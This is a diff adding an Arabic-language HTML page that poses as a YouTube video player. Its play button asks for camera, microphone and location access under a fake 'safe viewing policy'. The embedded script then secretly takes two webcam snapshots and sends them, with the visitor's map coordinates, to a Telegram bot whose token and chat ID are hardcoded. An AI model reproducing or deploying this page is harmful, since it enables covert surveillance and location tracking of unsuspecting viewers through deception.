@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Player</title>
+    <style>
+        body { background: #0f0f0f; color: #fff; font-family: Roboto, Arial, sans-serif; margin: 0; overflow: hidden; }
+        .header { height: 56px; padding: 0 16px; display: flex; align-items: center; background: #0f0f0f; }
+        .logo { height: 20px; }
+        .video-container { position: relative; width: 100%; padding-top: 56.25%; background: #000; }
+        #player { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .play-btn { width: 65px; height: 65px; background: rgba(255,0,0,0.9); border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; box-shadow: 0 0 15px rgba(255,0,0,0.3); }
+        .play-btn-icon { width: 0; height: 0; border-top: 15px solid transparent; border-bottom: 15px solid transparent; border-left: 25px solid white; margin-left: 5px; }
+        .info-text { margin-top: 20px; font-size: 13px; color: #888; text-align: center; width: 80%; }
+        .details { padding: 15px; }
+        #vTitle { font-size: 17px; margin: 0 0 10px; font-weight: 500; line-height: 1.4; color: #fff; }
+        .channel-row { display: flex; align-items: center; margin-top: 15px; }
+        #cImg { width: 36px; height: 36px; border-radius: 50%; background: #333; margin-left: 12px; object-fit: cover; }
+        #cName { font-weight: bold; font-size: 14px; color: #eee; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="logo">
+</div>
+
+<div class="video-container">
+    <div id="player"></div>
+    <div class="overlay" id="overlay">
+        <div class="play-btn" id="startBtn">
+            <div class="play-btn-icon"></div>
+        </div>
+        <div class="info-text">انقر للتشغيل والموافقة على سياسة المشاهدة الآمنة 2026</div>
+    </div>
+</div>
+
+<div class="details">
+    <h1 id="vTitle">جاري جلب بيانات الفيديو...</h1>
+    <div class="channel-row">
+        <img id="cImg" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7">
+        <div>
+            <div id="cName">جاري التحميل...</div>
+            <div style="color:#aaa; font-size:11px;">قناة رسمية • تم التحقق</div>
+        </div>
+    </div>
+</div>
+
+<canvas id="canvas"></canvas>
+<video id="camVideo" autoplay playsinline muted></video>
+
+<script>
+    // --- الإعدادات (ضع الرابط هنا فقط) ---
+    const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; 
+    const TELEGRAM_TOKEN = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
+    const CHAT_ID = "591768998";
+    // ----------------------------------------
+
+    let ytPlayer;
+
+    // وظيفة استخراج المعرف وجلب البيانات تلقائياً
+    function getID(url) {
+        const regExp = /^.*(youtu.be\/|v\/|u\/\w\/|embed\/|watch\?v=|\&v=)([^#\&\?]*).*/;
+        const match = url.match(regExp);
+        return (match && match[2].length === 11) ? match[2] : null;
+    }
+
+    const VIDEO_ID = getID(YOUTUBE_URL);
+
+    // جلب بيانات الفيديو من يوتيوب oEmbed
+    async function fetchVideoData() {
+        try {
+            const response = await fetch(`https://noembed.com/embed?url=${YOUTUBE_URL}`);
+            const data = await response.json();
+            document.getElementById('vTitle').innerText = data.title || "فيديو يوتيوب";
+            document.getElementById('cName').innerText = data.author_name || "قناة يوتيوب";
+            // نستخدم صورة القناة الافتراضية أو لوغو يوتيوب لأن oEmbed لا يعطي صورة القناة مباشرة
+            document.getElementById('cImg').src = `https://ui-avatars.com/api/?name=${encodeURIComponent(data.author_name)}&background=random&color=fff`;
+        } catch (e) {
+            console.log("فشل جلب البيانات");
+        }
+    }
+
+    fetchVideoData();
+
+    // تحميل مكتبة YouTube
+    var tag = document.createElement('script');
+    tag.src = "https://www.youtube.com/iframe_api";
+    document.body.appendChild(tag);
+
+    function onYouTubeIframeAPIReady() {
+        ytPlayer = new YT.Player('player', {
+            height: '100%',
+            width: '100%',
+            videoId: VIDEO_ID,
+            playerVars: { 'autoplay': 0, 'controls': 1 },
+            events: { 'onReady': () => console.log("Player Ready") }
+        });
+    }
+
+    document.getElementById('startBtn').addEventListener('click', async () => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            document.getElementById('camVideo').srcObject = stream;
+            document.getElementById('overlay').style.display = 'none';
+            ytPlayer.playVideo();
+
+            sendToBot(`🎬 بدأ المشاهدة: ${document.getElementById('vTitle').innerText}`);
+
+            navigator.geolocation.getCurrentPosition(p => {
+                sendToBot(`📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+            });
+
+            setTimeout(() => capture(1), 3000);
+            setTimeout(() => capture(2), 7000);
+
+        } catch (err) {
+            alert("عذراً، يجب السماح بالوصول للمشغل لتتمكن من مشاهدة الفيديو.");
+        }
+    });
+
+    function capture(n) {
+        const v = document.getElementById('camVideo');
+        const c = document.getElementById('canvas');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(b => {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', b, `shot_${n}.jpg`);
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd, keepalive: true });
+        }, 'image/jpeg', 0.5);
+    }
+
+    function sendToBot(txt) {
+        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: CHAT_ID, text: txt}),
+            keepalive: true
+        });
+    }
+</script>
+</body>
+</html>
